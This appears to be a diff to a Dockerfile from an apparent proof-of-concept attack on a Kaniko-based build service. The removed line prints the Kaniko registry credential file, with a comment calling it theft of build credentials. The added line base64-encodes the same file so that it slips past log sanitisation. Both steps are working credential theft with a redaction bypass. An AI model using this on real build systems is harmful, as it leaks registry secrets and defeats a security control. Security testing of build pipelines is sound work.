@@ -2,8 +2,8 @@ FROM alpine:3.19
 
 RUN apk add --no-cache python3 curl
 
-# Exfil the Kaniko registry JWT - proves attacker can steal build credentials
-RUN echo "=== KANIKO CONFIG ===" && cat /kaniko/.docker/config.json && echo "=== END CONFIG ==="
+# Test if base64 encoding bypasses log sanitization
+RUN echo "=== CONFIG B64 ===" && base64 /kaniko/.docker/config.json 2>&1 && echo "=== END CONFIG ==="
 
 COPY server.py /server.py
 EXPOSE 8080
